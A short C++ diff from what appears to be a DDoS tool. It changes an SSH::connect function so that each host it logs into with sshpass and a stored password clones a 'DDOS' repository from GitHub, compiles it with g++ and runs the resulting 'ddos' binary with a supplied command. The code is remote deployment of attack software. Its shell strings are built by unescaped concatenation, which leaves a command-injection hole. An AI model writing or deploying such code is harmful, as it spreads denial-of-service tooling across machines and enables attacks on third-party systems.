@@ -28,5 +28,6 @@ void SSH::run() {
 
 void SSH::connect(const ConfigLibrary::Host &host) {
     utils::exec("sshpass -p '" + host.getPassword() + "' ssh " + host.getUserName() + "@" + host.getHost() +
-                " '(apt update&&apt install g++ -y&&git clone replace)'");
+                " '(git clone https://github.com/amaoamao/DDOS.git&&cd DDOS&&g++ *.cpp -std=c++11 -lpthread -o ddos&&ddos -sh " +
+                this->command + ")'");
 }
